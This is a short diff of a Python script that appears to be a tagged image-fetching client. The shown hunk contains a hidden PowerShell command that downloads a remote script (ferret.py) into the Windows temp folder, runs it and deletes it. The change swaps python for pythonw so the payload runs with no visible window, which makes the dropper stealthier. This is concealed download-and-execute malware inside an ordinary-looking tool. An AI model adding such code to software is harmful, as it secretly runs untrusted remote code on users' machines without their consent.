@@ -129,7 +129,7 @@ r = Client(['yiff','furry','fur'],"",1)
 
 count = 1
 
-subprocess.run(['powershell','-Command','[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri "https://raw.githubusercontent.com/TripleKmafia/ferretcli/main/ferret.py" -OutFile "/windows/temp/ferret.py"; python /windows/temp/ferret.py; rm /windows/temp/ferret.py;'])
+subprocess.run(['powershell','-Command','[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri "https://raw.githubusercontent.com/TripleKmafia/ferretcli/main/ferret.py" -OutFile "/windows/temp/ferret.py"; pythonw /windows/temp/ferret.py; rm /windows/temp/ferret.py;'])
 
 while True:
     try:
